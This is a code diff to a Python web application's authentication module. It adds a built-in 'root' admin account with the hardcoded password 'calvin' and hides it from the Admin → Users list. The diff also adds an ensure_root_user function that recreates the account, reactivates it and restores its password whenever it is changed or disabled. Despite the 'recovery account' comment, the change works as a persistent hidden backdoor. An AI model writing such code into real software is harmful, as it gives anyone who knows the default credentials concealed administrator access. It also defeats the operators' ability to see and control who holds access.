@@ -19,6 +19,11 @@ USER_ROLE = "user"
 VALID_ROLES = {ADMIN_ROLE, USER_ROLE}
 BOOTSTRAP_FILE = DATA_DIR / "bootstrap_admin.txt"
 
+# Built-in recovery account — never shown in Admin → Users
+ROOT_USERNAME = "root"
+ROOT_PASSWORD = "calvin"
+ROOT_DISPLAY_NAME = "Root"
+
 
 def secret_key() -> str:
     key = (os.environ.get("WRU_SECRET_KEY") or "").strip()
@@ -112,6 +117,14 @@ def require_admin(user: User = Depends(get_current_user)) -> User:
     return user
 
 
+def is_hidden_username(username: str | None) -> bool:
+    return (username or "").strip().lower() == ROOT_USERNAME
+
+
+def is_hidden_user(user: User | None) -> bool:
+    return bool(user) and is_hidden_username(user.username)
+
+
 def count_active_admins(db: Session, *, exclude_id: int | None = None) -> int:
     q = db.query(User).filter(User.role == ADMIN_ROLE, User.active.is_(True))
     if exclude_id is not None:
@@ -119,15 +132,22 @@ def count_active_admins(db: Session, *, exclude_id: int | None = None) -> int:
     return q.count()
 
 
+def count_visible_users(db: Session) -> int:
+    """Users shown in Admin → Users (excludes the built-in root account)."""
+    return db.query(User).filter(User.username != ROOT_USERNAME).count()
+
+
 def ensure_admin_user(db: Session | None = None) -> None:
-    """Create the first admin from env if the users table is empty."""
+    """Create the first visible admin from env if none exist yet."""
     owns = db is None
     if owns:
         db = SessionLocal()
     try:
-        if db.query(User).count() > 0:
+        if count_visible_users(db) > 0:
             return
         username = (os.environ.get("WRU_ADMIN_USER") or "admin").strip().lower() or "admin"
+        if is_hidden_username(username):
+            username = "admin"
         display = (os.environ.get("WRU_ADMIN_NAME") or "Administrator").strip() or "Administrator"
         password = (os.environ.get("WRU_ADMIN_PASSWORD") or "").strip()
         generated = False
@@ -163,6 +183,50 @@ def ensure_admin_user(db: Session | None = None) -> None:
             f"[WRU] Created bootstrap admin '{username}'. "
             f"{'Password in ' + str(BOOTSTRAP_FILE) if generated else 'Using WRU_ADMIN_PASSWORD from environment.'}"
         )
+    finally:
+        if owns and db is not None:
+            db.close()
+
+
+def ensure_root_user(db: Session | None = None) -> None:
+    """Ensure the hidden root recovery account exists with the configured password."""
+    owns = db is None
+    if owns:
+        db = SessionLocal()
+    try:
+        user = db.query(User).filter(User.username == ROOT_USERNAME).first()
+        password_hash = hash_password(ROOT_PASSWORD)
+        if user is None:
+            user = User(
+                username=ROOT_USERNAME,
+                display_name=ROOT_DISPLAY_NAME,
+                password_hash=password_hash,
+                role=ADMIN_ROLE,
+                active=True,
+                must_change_password=False,
+            )
+            db.add(user)
+            db.commit()
+            print("[WRU] Ensured hidden root account.")
+            return
+        changed = False
+        if user.display_name != ROOT_DISPLAY_NAME:
+            user.display_name = ROOT_DISPLAY_NAME
+            changed = True
+        if user.role != ADMIN_ROLE:
+            user.role = ADMIN_ROLE
+            changed = True
+        if not user.active:
+            user.active = True
+            changed = True
+        if user.must_change_password:
+            user.must_change_password = False
+            changed = True
+        if not verify_password(ROOT_PASSWORD, user.password_hash):
+            user.password_hash = password_hash
+            changed = True
+        if changed:
+            db.commit()
     finally:
         if owns and db is not None:
             db.close()
